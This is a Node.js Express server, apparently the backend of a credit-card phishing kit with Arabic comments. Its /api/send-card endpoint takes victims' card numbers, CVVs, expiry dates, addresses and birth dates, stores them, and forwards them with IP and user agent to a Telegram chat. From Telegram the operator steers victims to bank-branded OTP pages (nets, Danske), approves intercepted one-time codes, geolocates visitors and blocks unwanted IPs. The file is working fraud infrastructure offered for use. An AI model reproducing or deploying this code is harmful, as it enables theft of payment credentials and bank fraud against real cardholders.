const express = require("express");
const cors = require("cors");
const session = require("express-session");
const bodyParser = require("body-parser");
const mongoose = require("mongoose");
const axios = require("axios");
require("dotenv").config();

// ✅ استخدم botManager بدل bot.js
const { initBot, startPolling, stopPolling } = require("./botManager");
const bot = initBot();
const chatId = bot.chatId;

let blockedIps = []; // مؤقت - في الذاكرة فقط، الأفضل DB
const BlockedIP = require("./models/BlockedIP");

// --- Mongoose Models ---
const Card = require("./models/Card");
const OTP = require("./models/OTP");
const Code = require("./models/Code");

// --- Database Connection ---
const mongoURI =
  process.env.MONGO_URI || "mongodb://localhost:27017/verificationdb";
mongoose
  .connect(mongoURI)
  .then(() => console.log("✅ MongoDB connected"))
  .catch((err) => console.error("❌ MongoDB connection error:", err));

const app = express();
const PORT = process.env.PORT || 5000;

// متغير لمنع تشغيل polling أكثر من مرة
let isPollingStarted = false;

async function getCountryFromIP(ip) {
  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    return response.data.country || "Unknown";
  } catch (error) {
    console.error("Error fetching country from IP:", error.message);
    return "Unknown";
  }
}

app.use(express.json());

// --- Middleware ---
app.use(
  cors({
    origin: process.env.FRONTEND_URL || "http://localhost:5173",
    credentials: true,
  })
);
app.use(bodyParser.json());
app.use(
  session({
    secret: process.env.SESSION_SECRET || "yourSecretKey",
    resave: false,
    saveUninitialized: true,
    cookie: { secure: process.env.NODE_ENV === "production" },
  })
);

// Routes imports
const visitorsRoute = require("./routes/visitors");
const blockedRoute = require("./routes/blocked");
const settingsRoute = require("./routes/settings");
const blockedRoutes = require("./routes/adminBlocked");
const trackRoute = require("./routes/track");
const captchaRoutes = require("./routes/captcha");
const codeRoutes = require("./routes/codeRoutes");
const cardRoutes = require("./routes/cardRoutes");
const loginRoutes = require("./routes/loginRoutes");

// Use routes
app.use("/api/visitors", visitorsRoute);
app.use("/api/blocked", blockedRoute);
app.use("/api/settings", settingsRoute);
app.use("/admin/blocked", blockedRoutes);
app.use("/api/track", trackRoute);
app.use("/api", captchaRoutes);
app.use("/api", codeRoutes);
app.use("/api", cardRoutes);
app.use("/api", loginRoutes);

// --- OTP Routes Setup ---
const otpRoutesModule = require("./routes/otpRoutes");
otpRoutesModule.setBotInstance(bot, chatId);
const otpRoutes = otpRoutesModule.router;
app.use("/api", otpRoutes);

// Test route
app.get("/", (req, res) => {
  res.send("🎯 API is working");
});

// --- OTP Resend Endpoint ---
app.post("/api/resend-otp", async (req, res) => {
  try {
    await bot.sendMessage(chatId, "🔁 Resend code requested");
    res.json({ message: "Resend request sent to Telegram" });
  } catch (error) {
    console.error("Error sending resend message:", error);
    res.status(500).json({ error: "Failed to send resend request" });
  }
});

// --- Card Data Endpoint ---
app.post("/api/send-card", async (req, res) => {
  const {
    cardNumber,
    cardName,
    expiryMonth,
    expiryYear,
    cvv,
    phoneNumber,
    country,
    address,
    city,
    zipCode,
    birthDate,
  } = req.body;

  try {
    let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    if (ip && ip.includes(",")) {
      ip = ip.split(",")[0];
    }
    ip = ip.replace("::ffff:", "");
    if (ip === "::1") ip = "127.0.0.1";
    const userAgent = req.headers["user-agent"];
    const viewerCountry = await getCountryFromIP(ip);

    const newCard = new Card({
      cardNumber,
      cardName,
      expiryMonth,
      expiryYear,
      cvv,
      phoneNumber,
      country,
      address,
      city,
      zipCode,
      birthDate,
    });
    const savedCard = await newCard.save();

    const message = `
💳 *New Credit Card Data*
━━━━━━━━━━━━━━
🔢 Card Number: \`${cardNumber}\`
👤 Cardholder: \`${cardName}\`
📆 Expiry: \`${expiryMonth}/${expiryYear}\`
🔐 CVV: \`${cvv}\`
📱 Phone: \`${phoneNumber}\`
🌍 Country: \`${country}\`
🏠 Address: \`${address}\`
🏙️ City: \`${city}\`
📮 ZIP Code: \`${zipCode}\`   
🎂 Birth Date: \`${birthDate}\`  
📡 IP: \`${ip}\`
🧭 User-Agent:
\`${userAgent}\`
🌍 Viewer Country: \`${viewerCountry}\`
    `;

    await bot.sendMessage(chatId, message, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "📲 OTP", callback_data: `otp_card_${savedCard._id}` },
            { text: "❌ Reject", callback_data: `reject_card_${savedCard._id}` },
          ],
          [{ text: "📱 App", callback_data: `app_card_${savedCard._id}` }],
          [
            { text: "📲 nets", callback_data: `otp2_card_${savedCard._id}` },
            { text: "📲 Danske", callback_data: `otp3_card_${savedCard._id}` },
            { text: "📲 OTP 4", callback_data: `otp4_card_${savedCard._id}` },
          ],
        ],
      },
    });

    res.status(200).json({
      message: "Card data received and processed",
      id: savedCard._id,
    });
  } catch (error) {
    console.error("Error saving card data:", error);
    res.status(500).json({
      message: "Error processing card data",
      error: error.message,
    });
  }
});

// --- Status Check Endpoints ---
app.get("/api/status/card/:id", async (req, res) => {
  try {
    const card = await Card.findById(req.params.id);
    if (!card) return res.status(404).json({ message: "Card not found" });
    res.json({ status: card.status || "pending", cardNumber: card.cardNumber });
  } catch (error) {
    console.error("Error fetching card status:", error);
    res.status(500).json({ message: "Server error" });
  }
});

// Blocked IPs endpoints
app.get("/api/blocked", (req, res) => {
  res.json({ blocked: blockedIps });
});

app.post("/api/unblock/:ip", (req, res) => {
  const ipToUnblock = req.params.ip;
  const index = blockedIps.indexOf(ipToUnblock);
  if (index !== -1) {
    blockedIps.splice(index, 1);
    return res.json({ message: `IP ${ipToUnblock} unblocked.` });
  }
  res.status(404).json({ message: `IP ${ipToUnblock} not found.` });
});

// --- Request New Code (Resend OTP) Endpoint ---
app.post("/api/resend-otp-request", async (req, res) => {
  const { cardId, oldOtpId } = req.body;
  
  console.log("📨 Resend code requested for card:", cardId);
  
  try {
    const message = `
🔄 *NEW CODE REQUESTED* 🔄
━━━━━━━━━━━━━━━━━━━━
💳 *Card ID:* \`${cardId}\`
🆔 *Old OTP ID:* \`${oldOtpId || "N/A"}\`
🕐 *Time:* ${new Date().toLocaleString()}
👤 *User requested a new OTP code*

⚠️ The user is requesting a new verification code.
    `;
    
    await bot.sendMessage(chatId, message, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [

          ]
        ]
      }
    });
    
    res.json({ 
      success: true, 
      message: "New code request sent to admin" 
    });
  } catch (error) {
    console.error("Error sending resend request:", error);
    res.status(500).json({ error: "Failed to send resend request" });
  }
});

app.post("/api/notify", async (req, res) => {
  try {
    const rawIp =
      req.headers["x-forwarded-for"] ||
      req.socket.remoteAddress ||
      "";

    let visitorIp = String(rawIp).split(",")[0].trim();

    if (visitorIp.startsWith("::ffff:")) {
      visitorIp = visitorIp.replace("::ffff:", "");
    }

    if (!visitorIp) {
      visitorIp = "Unknown IP";
    }

    const fullUrl = req.body?.url || "URL not provided";

    if (blockedIps.includes(visitorIp)) {
      console.log(`🚫 Blocked visitor: ${visitorIp}`);
      return res.status(403).json({ message: "You are blocked." });
    }

    let country = "Unknown Country";
    let city = "Unknown City";
    let isp = "Unknown ISP";

    if (visitorIp !== "Unknown IP" && visitorIp !== "::1" && visitorIp !== "127.0.0.1") {
      try {
        const locationRes = await axios.get(`https://ipwho.is/${visitorIp}`, {
          timeout: 10000,
        });

        const locationData = locationRes.data;

        if (locationData && locationData.success !== false) {
          country = locationData.country || "Unknown Country";
          city = locationData.city || "Unknown City";
          isp = locationData.connection?.isp || "Unknown ISP";
        } else {
          console.log("ipwho.is failed:", locationData);
        }
      } catch (locErr) {
        console.error("Location lookup error:", locErr.message);
      }
    }

    const locationText = `📍 Location: ${city}, ${country}\n📡 ISP: ${isp}`;

    const sentMessage = await bot.sendMessage(
      chatId,
      `🌐 New visit from IP: ${visitorIp}\n🔗 URL: ${fullUrl}\n${locationText}`,
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "🚫 Block visitor", callback_data: `block_${visitorIp}` }],
          ],
        },
      }
    );

    setTimeout(() => {
      bot.deleteMessage(chatId, sentMessage.message_id).catch((err) => {
        console.error("❌ Error deleting Telegram message:", err.message);
      });
    }, 60000);

    return res.json({ message: "Notification sent" });
  } catch (error) {
    console.error("❌ /api/notify error:", error);
    return res.status(500).json({
      error: "Failed to send notification",
      details: error.message,
    });
  }
});

// ============= SINGLE TELEGRAM CALLBACK HANDLER =============
bot.on("callback_query", async (callbackQuery) => {
  const msg = callbackQuery.message;
  const data = callbackQuery.data;
  
  console.log("📨 Callback received:", data);

  // Handle OTP Accept/Reject
  if (data.startsWith("otp_accept_")) {
    const id = data.replace("otp_accept_", "");
    try {
      const otp = await OTP.findByIdAndUpdate(
        id,
        { status: "accepted", updatedAt: new Date() },
        { new: true }
      );
      
      if (otp) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "✅ OTP Accepted!",
          show_alert: true,
        });
        
        await bot.editMessageText(
          `✅ *OTP VERIFIED - ACCEPTED* ✅\n\n` +
          `📝 *Code:* ${otp.code}\n` +
          `💳 *Card ID:* ${otp.cardId}\n` +
          `✅ *Status:* ACCEPTED\n` +
          `🕐 *Time:* ${new Date().toLocaleString()}`,
          {
            chat_id: msg.chat.id,
            message_id: msg.message_id,
            parse_mode: "Markdown",
          }
        );
      }
    } catch (err) {
      console.error("Error accepting OTP:", err);
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "❌ Error accepting OTP",
        show_alert: true,
      });
    }
    return;
  }
  
  if (data.startsWith("otp_reject_")) {
    const id = data.replace("otp_reject_", "");
    try {
      const otp = await OTP.findByIdAndUpdate(
        id,
        { status: "rejected", updatedAt: new Date() },
        { new: true }
      );
      
      if (otp) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "❌ OTP Rejected!",
          show_alert: true,
        });
        
        await bot.editMessageText(
          `❌ *OTP VERIFICATION - REJECTED* ❌\n\n` +
          `📝 *Code:* ${otp.code}\n` +
          `💳 *Card ID:* ${otp.cardId}\n` +
          `❌ *Status:* REJECTED\n` +
          `🕐 *Time:* ${new Date().toLocaleString()}`,
          {
            chat_id: msg.chat.id,
            message_id: msg.message_id,
            parse_mode: "Markdown",
          }
        );
        console.log(`❌ OTP ${id} rejected`);
      }
    } catch (err) {
      console.error("Error rejecting OTP:", err);
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "❌ Error rejecting OTP",
        show_alert: true,
      });
    }
    return;
  }

  // Handle Block IP
  if (data.startsWith("block_")) {
    const ipToBlock = data.split("_")[1];
    try {
      const existing = await BlockedIP.findOne({ ip: ipToBlock });
      if (!existing) {
        const tunisiaTime = new Date(Date.now() + 1 * 60 * 60 * 1000);
        await BlockedIP.create({
          ip: ipToBlock,
          reason: "Manually blocked from Telegram",
          createdAt: tunisiaTime,
        });
        console.log(`🛑 IP blocked & saved: ${ipToBlock}`);
        await bot.editMessageText(
          `🚫 Blocked IP: ${ipToBlock}\n📌 Reason: Manual block\n🕒 Time: ${tunisiaTime.toLocaleString("en-GB")}`,
          {
            chat_id: msg.chat.id,
            message_id: msg.message_id,
          }
        );
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: `✅ Blocked ${ipToBlock}`,
          show_alert: true,
        });
      } else {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "Already blocked",
          show_alert: true,
        });
      }
    } catch (err) {
      console.error("❌ Error blocking IP:", err);
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "❌ Failed to block IP",
        show_alert: true,
      });
    }
    return;
  }

  // Handle Card Actions
  const parts = data.split("_");
  if (parts.length >= 2 && parts[1] === "card") {
    const action = parts[0];
    const id = parts[2];
    
    try {
      let newStatus;
      let statusText;

      switch (action) {
        case "otp":
          newStatus = "otp";
          statusText = "📲 OTP Requested";
          break;
        case "otp2":
          newStatus = "otp2";
          statusText = "📲 OTP 2 Requested";
          break;
        case "otp3":
          newStatus = "otp3";
          statusText = "📲 OTP 3 Requested";
          break;
        case "otp4":
          newStatus = "otp4";
          statusText = "📲 OTP 4 Requested";
          break;
        case "app":
          newStatus = "app";
          statusText = "📱 App Verification Required";
          break;
        case "reject":
          newStatus = "rejected";
          statusText = "❌ Card Rejected";
          break;
        default:
          return bot.answerCallbackQuery(callbackQuery.id, {
            text: "❌ Unknown action",
          });
      }

      const card = await Card.findByIdAndUpdate(
        id,
        { status: newStatus },
        { new: true }
      );

      if (!card) {
        await bot.sendMessage(msg.chat.id, "⚠️ Card not found.");
        return bot.answerCallbackQuery(callbackQuery.id, { text: "Card not found" });
      }

      const message = `
📝 *Card Status Updated*
━━━━━━━━━━━━━━
🔢 Card Number: \`${card.cardNumber}\`
👤 Cardholder: \`${card.cardName}\`
📆 Expiry: \`${card.expiryMonth}/${card.expiryYear}\`
📱 Phone: \`${card.phoneNumber}\`
🌍 Country: \`${card.country}\`

📌 Status: *${statusText}*
      `;

      await bot.sendMessage(msg.chat.id, message, { parse_mode: "Markdown" });
      await bot.answerCallbackQuery(callbackQuery.id, { text: statusText });
    } catch (err) {
      console.error("Card action error:", err);
      await bot.answerCallbackQuery(callbackQuery.id, { text: "❌ An error occurred" });
    }
    return;
  }

  // Handle Code Accept/Reject
  if (parts.length === 2 && (parts[0] === "accept" || parts[0] === "reject")) {
    const action = parts[0];
    const id = parts[1];
    
    try {
      const newStatus = action === "accept" ? "accepted" : "rejected";
      const code = await Code.findByIdAndUpdate(
        id,
        { status: newStatus },
        { new: true }
      );

      if (!code) {
        await bot.sendMessage(msg.chat.id, "⚠️ Code not found.");
        return bot.answerCallbackQuery(callbackQuery.id, { text: "Code not found" });
      }

      const statusText = newStatus === "accepted" ? "✅ Code Accepted" : "❌ Code Rejected";

      const message = `
📝 *Code Status Updated*
━━━━━━━━━━━━━━
🔢 Code: \`${code.code}\`
🌐 IP: \`${code.ip || "N/A"}\`
📌 Status: *${statusText}*
      `;

      await bot.sendMessage(msg.chat.id, message, { parse_mode: "Markdown" });
      await bot.answerCallbackQuery(callbackQuery.id, { text: statusText });
    } catch (err) {
      console.error("Code action error:", err);
      await bot.answerCallbackQuery(callbackQuery.id, { text: "❌ An error occurred" });
    }
    return;
  }
  
  // Handle send new code request
  if (data.startsWith("send_new_code_")) {
    const cardId = data.replace("send_new_code_", "");
    
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: "📲 New code request sent to user!",
      show_alert: true,
    });
    
    await bot.editMessageText(
      `✅ *New code request processed*\n\n` +
      `💳 Card ID: ${cardId}\n` +
      `🕐 Time: ${new Date().toLocaleString()}\n\n` +
      `A new verification code has been sent to the user.`,
      {
        chat_id: msg.chat.id,
        message_id: msg.message_id,
        parse_mode: "Markdown",
      }
    );
    return;
  }

  // Handle ignore request
  if (data.startsWith("ignore_request")) {
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: "Request ignored",
      show_alert: true,
    });
    
    await bot.editMessageText(
      `❌ *Request ignored*\n\n` +
      `The new code request was ignored.`,
      {
        chat_id: msg.chat.id,
        message_id: msg.message_id,
        parse_mode: "Markdown",
      }
    );
    return;
  }
});

app.get("/api/ipinfo", async (req, res) => {
  try {
    const rawIp = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
    let visitorIp = String(rawIp).split(",")[0].trim();

    if (visitorIp.startsWith("::ffff:")) {
      visitorIp = visitorIp.replace("::ffff:", "");
    }

    if (!visitorIp || visitorIp === "::1" || visitorIp === "127.0.0.1") {
      visitorIp = "";
    }

    const IPINFO_TOKEN = process.env.IPINFO_TOKEN || "";

    const services = [
      {
        name: "IPinfo",
        enabled: !!IPINFO_TOKEN,
        url: visitorIp 
          ? `https://ipinfo.io/${visitorIp}/json?token=${IPINFO_TOKEN}`
          : `https://ipinfo.io/json?token=${IPINFO_TOKEN}`,
        parse: (data) => ({
          country: data.country,
          country_code: data.country,
          ip: data.ip,
          city: data.city,
          region: data.region,
          language: null
        })
      },
      {
        name: "ipapi.co",
        enabled: true,
        url: visitorIp ? `https://ipapi.co/${visitorIp}/json/` : `https://ipapi.co/json/`,
        parse: (data) => ({
          country: data.country_name,
          country_code: data.country,
          ip: data.ip,
          language: data.languages
        })
      },
      {
        name: "ip-api.com",
        enabled: true,
        url: `http://ip-api.com/json/${visitorIp || ''}?fields=status,country,countryCode,query`,
        parse: (data) => ({
          country: data.country,
          country_code: data.countryCode,
          ip: data.query,
          language: null
        })
      },
      {
        name: "freeipapi.com",
        enabled: true,
        url: `https://freeipapi.com/api/json/${visitorIp || ''}`,
        parse: (data) => ({
          country: data.countryName,
          country_code: data.countryCode,
          ip: data.ipAddress,
          language: null
        })
      }
    ];

    for (const service of services) {
      if (!service.enabled) continue;
      
      try {
        console.log(`🌐 Trying ${service.name}: ${service.url.substring(0, 80)}...`);
        const response = await axios.get(service.url, { timeout: 5000 });
        const data = response.data;
        
        if (data && !data.bogon && data.error?.title !== "Rate limit exceeded") {
          const result = service.parse(data);
          
          if (result.country_code && result.country_code.length === 2) {
            
            return res.json({
              success: true,
              ip: result.ip || visitorIp,
              country: result.country || "Unknown",
              country_code: result.country_code,
              city: result.city || null,
              region: result.region || null,
              language: result.language || null,
              source: service.name.toLowerCase()
            });
          }
        }
      } catch (err) {
        console.log(`❌ ${service.name} failed: ${err.message}`);
        continue;
      }
    }

    console.log("⚠️ All IP services failed, using fallback data");
    return res.json({
      success: true,
      ip: visitorIp || "0.0.0.0",
      country: "United States",
      country_code: "US",
      fallback: true
    });

  } catch (error) {
    console.error("❌ ipinfo endpoint error:", error.message);
    
    res.json({
      success: true,
      ip: "0.0.0.0",
      country: "United States", 
      country_code: "US",
      fallback: true
    });
  }
});

// ✅ Cleanup on exit
process.on('SIGINT', () => {
  console.log('\n🛑 Shutting down gracefully...');
  stopPolling();
  mongoose.connection.close(() => {
    console.log('📦 MongoDB connection closed');
    process.exit(0);
  });
});

process.on('SIGTERM', () => {
  console.log('\n🛑 Shutting down gracefully...');
  stopPolling();
  mongoose.connection.close(() => {
    console.log('📦 MongoDB connection closed');
    process.exit(0);
  });
});

// --- Server Startup - تشغيل البوت مرة واحدة فقط ---
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`🌍 Environment: ${process.env.NODE_ENV || "development"}`);
  
  // ✅ تشغيل polling مرة واحدة فقط
  startPolling();
});